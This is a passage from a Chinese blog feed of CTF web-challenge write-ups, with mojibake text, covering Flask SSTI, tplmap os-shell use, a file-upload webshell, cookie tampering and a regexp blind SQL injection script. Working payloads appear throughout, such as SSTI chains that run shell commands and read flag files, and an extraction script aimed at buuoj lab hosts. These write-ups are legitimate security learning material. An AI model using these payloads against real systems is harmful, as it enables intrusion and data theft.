        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[rc4|ssti|flask]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211302124.png" alt="image-20210720211302124"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å°±æ˜¯é çµå…‰ä¸€é—ª</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211632653.png" alt="image-20210720211632653"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211704135.png" alt="image-20210720211704135"></p><p>buuä¸Šçš„é¢˜æœ€è¿‘ä¸çŸ¥é“ä¸ºå•¥ï¼Œæµè§ˆå™¨é‡Œæ•²è¿æ¥å¿…è§¦å‘dns rebind attackæ£€æµ‹ï¼ŒçœŸçš„çƒ¦</p><p>è¾“åˆ°12345çš„æ—¶å€™æŠ¥é”™äº†</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720211917580.png" alt="image-20210720211917580"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720212233582.png" alt="image-20210720212233582"></p><p>rc4ç®—æ³•ï¼Œå¯†é’¥HereIsTreasure</p><p>è¯•è¯•?secret=a,ç»“æœä¸º4ï¼Œè¯•äº†ç½‘ä¸Šå¥½å‡ ä¸ªåœ¨çº¿rc4åŠ å¯†çš„ï¼Œ<a href="http://tool.chacuo.net/cryptrc4%E5%B0%B1%E8%BF%99%E4%B8%AA%E7%BB%93%E6%9E%9C%E4%B8%80%E8%87%B4">http://tool.chacuo.net/cryptrc4å°±è¿™ä¸ªç»“æœä¸€è‡´</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720212708801.png" alt="image-20210720212708801"></p><p>æœç„¶ã€‚</p><p>flask+templateï¼Œæ€€ç–‘æ˜¯ssti</p><p>è›®æ€ªçš„ï¼Œæ˜æ˜æ˜¯åŠ å¯†ï¼Œæ³¨é‡Šåˆå†™ä¸ªè§£å¯†ã€‚</p><p>é‚£å¤§æ¦‚å°±æ˜¯æ£€æµ‹åŠ å¯†å­—ç¬¦è¾“å‡ºè§£å¯†ï¼Œæ£€æµ‹æœªåŠ å¯†å­—ç¬¦è¾“å‡ºåŠ å¯†ã€‚</p><p>æŸ¥æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flagåœ¨flag.txté‡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720221827489.png" alt="image-20210720221827489"></p><p>äºæ˜¯è¯»/flag.txt</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥æ‰“è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œéœ€è¦å…ˆrc4åŠ å¯†ï¼ŒåŠ å¯†åæœ‰å¾ˆå¤šä¸å¯è§†å­—ç¬¦ï¼Œæ‰€ä»¥å†urlencodeä¸€ä¸‹</p><p>æ³¨æ„æŠŠ<code>encode all special chars</code>ç‚¹ä¸Šï¼Œä¸ç„¶#ç­‰å­—ç¬¦ä¸ä¼šè¢«urlencodeï¼Œgetä¼ å€¼å°±å‡ºé—®é¢˜äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/image-20210720222043615.png" alt="image-20210720222043615"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RootersCTF2019]I_&lt;3_Flask</title>
      <link href="/p/2417191136.html"/>
      <url>/p/2417191136.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[flask|ssti]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720181727848.png" alt="image-20210720181727848"></p><p>å¯è§flaskï¼Œç›²çŒœä¸€æ‰‹ssti</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç²—ç•¥çœ‹äº†ä¸€åœˆï¼Œæ²¡å‘ç°ä»€ä¹ˆï¼Œæ‰«æ‰«ç›®å½•è¯•è¯•</p><p>æ‰«äº†ä¸€åœˆæ²¡å‘ç°å•¥ï¼Œç…§ç€SSTIè·¯å­èµ°å§ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720182835086.png" alt="image-20210720182835086"></p><p>å¾—ï¼Œè¿˜çœŸæ˜¯</p><p>ä¹Ÿå¯ä»¥æ‹¿arjunè·‘ä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720185121498.png" alt="image-20210720185121498"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720183120837.png" alt="image-20210720183120837"></p><p>ç›´æ¥è·‘tplmapå§</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python2 tplmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>adce423c<span class="token operator">-</span><span class="token number">3166</span><span class="token operator">-</span><span class="token number">4725</span><span class="token operator">-</span>b1ae<span class="token operator">-</span>eb79b910f76a<span class="token punctuation">.</span>node4<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>?name<span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„è¦ä¹ˆç”¨åŒå¼•å·ï¼Œè¦ä¹ˆä¸åŠ å¼•å·ï¼Œå•å¼•å·ä¼šæŠ¥è¿™ä¸ªé”™è¯¯ï¼Œä¼°è®¡ç±»ä¼¼äºPHPé‚£ç§å•å¼•å·å½“çº¯å­—ç¬¦ä¸²ï¼ŒåŒå¼•å·æ‰èƒ½è§£æçš„æƒ…å†µ</p><pre class="line-numbers language-none"><code class="language-none">[!][tplmap] Exiting: No connection adapters were found for<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720185825391.png" alt="image-20210720185825391"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python2 tplmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>adce423c<span class="token operator">-</span><span class="token number">3166</span><span class="token operator">-</span><span class="token number">4725</span><span class="token operator">-</span>b1ae<span class="token operator">-</span>eb79b910f76a<span class="token punctuation">.</span>node4<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>?name<span class="token operator">=</span><span class="token number">123</span> <span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">-</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-I-3-Flask/image-20210720185902746.png" alt="image-20210720185902746"></p><p>ç»“æŸ</p><h2 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h2><p><a href="https://portswigger.net/research/server-side-template-injection">Server-Side Template Injection</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[WUSTCTF2020]CV Maker</title>
      <link href="/p/233234935.html"/>
      <url>/p/233234935.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719175410526.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>çœ‹åˆ°è¿™ç§ç«™æŒºå“äººçš„ï¼Œéšä¾¿ç‚¹äº†ç‚¹å¤§å¤šéƒ½æ˜¯æ­»ç•Œé¢ï¼Œè¿˜å¥½ã€‚</p><p>å…ˆå°è¯•æ€§çš„æ‰«ä¸€ä¸‹ï¼Œæ²¡æ‰«åˆ°ä»€ä¹ˆä¿¡æ¯æ³„æ¼ã€‚</p><p>æ³¨å†Œç”¨æˆ·ï¼Œè¿˜æŠ¥é”™äº†</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719180218415.png"></p><p>ç™»å½•ï¼Œæœ‰ä¸ªå¤´åƒä¸Šä¼ ï¼Œå…ˆè¯•è¯•ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719180554597.png"></p><p>çœ‹æ¥ç”¨äº†exif_imagetypeå‡½æ•°é™åˆ¶äº†ï¼ŒåŠ ä¸ªæ–‡ä»¶å¹»æ•°å¯ç»•è¿‡ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719180648510.png" alt="image-20210719180648510"></p><p>è¯•äº†è¯•ï¼Œæ²¡æƒ³åˆ°å¯¹ä¸Šä¼ åç¼€æ²¡é™åˆ¶</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719204736684.png"></p><p>ç›´æ¥å°±ä¼ ä¸Šå»äº†ï¼Œèšå‰‘è¿æ¥ä¸‹ï¼ŒæŸ¥çœ‹æ ¹ç›®å½•flagï¼Œç»“æŸã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-WUSTCTF2020-CV-Maker/image-20210719204750659.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[watevrCTF-2019]Cookie Store</title>
      <link href="/p/268857083.html"/>
      <url>/p/268857083.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719171957875.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>é…åˆé¢˜ç›®åï¼Œå¤§æ¦‚å°±çŸ¥é“æ˜¯ä»cookieå…¥æ‰‹ã€‚</p><p>éœ€è¦æŠŠpriceæ”¹åˆ°100ç„¶åè´­ä¹°è¿™ä¸ªã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719172150122.png" alt="image-20210719172150122"></p><p>ä¹°äº†å‡ æ¬¡ï¼Œå‘ç°cookieåœ¨å˜åŒ–ï¼Œä¸€çœ‹cookie</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719174338184.png"></p><p>base64å­—ç¬¦ä¸²ï¼Œè§£å¯†ä¸‹</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"money"</span><span class="token operator">:</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token property">"history"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"Yummy chocolate chip cookie"</span><span class="token punctuation">,</span> <span class="token string">"Yummy chocolate chip cookie"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‚£æ²¡å•¥å¥½è¯´çš„äº†ï¼Œæ”¹ä¸‹ï¼Œå†base64åŠ å¯†ï¼Œç”¨editethiscookieæ”¹ä¸‹cookieï¼Œåˆ·æ–°å†è´­ä¹°ï¼Œç»“æŸã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Cookie-Store/image-20210719174515659.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> Cookies </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[NCTF2019]SQLi</title>
      <link href="/p/2489403193.html"/>
      <url>/p/2489403193.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[%00|regexp|sqlæ³¨å…¥regexp]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718163621816.png" alt="image-20210718163621816"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>é¦–å…ˆå…ˆfuzzä¸€ä¸‹ï¼Œæ£€æµ‹å¦‚ä¸‹å­—ç¬¦</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718164754285.png" alt="image-20210718164754285"></p><p>è¿™è¿‡æ»¤çš„ä¹Ÿå¤ªå…¨äº†ã€‚</p><p>è¯•äº†è¯•ä¸å¤ªè¡Œã€‚æ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰å…¶ä»–çº¿ç´¢</p><p>æ‰“å¼€<code>/robots.txt</code>ï¼Œé‡Œé¢æœ‰æç¤º<code>/hint.txt</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718165858952.png" alt="image-20210718165858952"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718171656156.png" alt="image-20210718171656156"></p><h3 id="00æˆªæ–­è¦ç‚¹"><a href="#00æˆªæ–­è¦ç‚¹" class="headerlink" title="%00æˆªæ–­è¦ç‚¹"></a>%00æˆªæ–­è¦ç‚¹</h3><blockquote><p>php&lt;5.3.4,ä¸”magic_quotes_gpc==offå¯è¿›è¡Œ%00æˆªæ–­</p></blockquote><p><code>%00</code>ä¸èƒ½åœ¨æµè§ˆå™¨ä¸­æ‰“ï¼Œä¼šè¢«ç¼–ç æˆ%2500</p><p>åœ¨å¾ˆè€çš„burpsuiteç‰ˆæœ¬ä¸­ä¸­éœ€è¦è½¬åˆ°hexæ”¹00</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718173258923.png" alt="image-20210718173258923"></p><p>åˆšè¯•äº†ä¸‹2020.6ç‰ˆå¯ä»¥ç›´æ¥æ‰“%00,</p><p>2021ç‰ˆç›´æ¥å°±æŠŠhexæ ç»™å–æ¶ˆäº†,ä¸è¿‡å¯ä»¥ç›´æ¥æ‰“ã€‚<br>pythonä¸­ä¼ <code>%00</code>ä¸èƒ½ç›´æ¥ä¼ ï¼Œéœ€è¦</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseparse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>postmané‡Œç›´æ¥æ‰“<code>%2500</code>å°±å¥½</p><hr><p>åœ¨æ­¤æµ‹è¯•ä¸‹%00æˆªæ–­,payload:</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;\&amp;passwd&#x3D;||1;%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‹¥æ˜¯æˆåŠŸä¼šæœ‰ä¸ª302é‡å®šå‘ï¼Œè¯´æ˜å¯è¡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718173354834.png" alt="image-20210718173354834"></p><h3 id="åˆ©ç”¨regexpæŸ¥å€¼"><a href="#åˆ©ç”¨regexpæŸ¥å€¼" class="headerlink" title="åˆ©ç”¨regexpæŸ¥å€¼"></a>åˆ©ç”¨regexpæŸ¥å€¼</h3><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718191412562.png"></p><p>é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>å…ˆå¿«é€Ÿè·‘ä¸€ä¸‹ï¼Œçœ‹çœ‹å›æ˜¾</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NCTF2019-SQLi/image-20210718191648591.png" alt="image-20210718191648591"></p><p>ç„¶åè·‘è„šæœ¬å§</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurl <span class="token operator">=</span> <span class="token string">'http://6c177fcd-3eaf-4520-9cab-fd073e403007.node4.buuoj.cn/'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token comment"># 26ä¸ªå­—æ¯+æ•°å­—+ä¸€äº›ç¬¦å·ï¼Œå°å¿ƒé€šé…ç¬¦</span>s <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_&#123;&#125;'</span>last <span class="token operator">=</span> <span class="token string">'tmp'</span><span class="token keyword">while</span><span class="token punctuation">(</span>result <span class="token operator">!=</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>    last <span class="token operator">=</span> result    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"||(passwd)regexp(\"^&#123;&#125;\");&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>result<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>            <span class="token string">"passwd"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">503</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Too fast'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">b'welcome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            result <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]'</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·‘å‡º</p><pre class="line-numbers language-none"><code class="language-none">you_will_never_know7788990<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è´¦å·éšä¾¿è¾“ï¼Œå¯†ç å°±è¿™ä¸ªï¼Œç™»é™†ä¸‹ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[HarekazeCTF2019]encode_and_encode</title>
      <link href="/p/2319372040.html"/>
      <url>/p/2319372040.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[json|unicode]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// no path traversal</span>    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment">// no stream wrapper</span>    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment">// no data exfiltration</span>    <span class="token string single-quoted-string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>é¦–å…ˆçœ‹<code>php://input</code>ï¼Œè€Œé<code>$_GET</code>,<code>$_POST</code>,<code>$_REQUEST</code>ï¼Œæ‰€ä»¥ä¸ä¼šè¿›è¡Œurldecodeï¼Œå‘ä»€ä¹ˆåŒ…å°±æ˜¯ä»€ä¹ˆåŒ…ã€‚</p><p>æºç çš„æœ€åæœ‰ä¸ªå°†flagç»™æ›¿æ¢çš„æ“ä½œï¼Œæ˜æ˜¾æ˜¯ä¸èƒ½æ˜æ–‡è¯»å–ï¼Œéœ€è¦åŠ 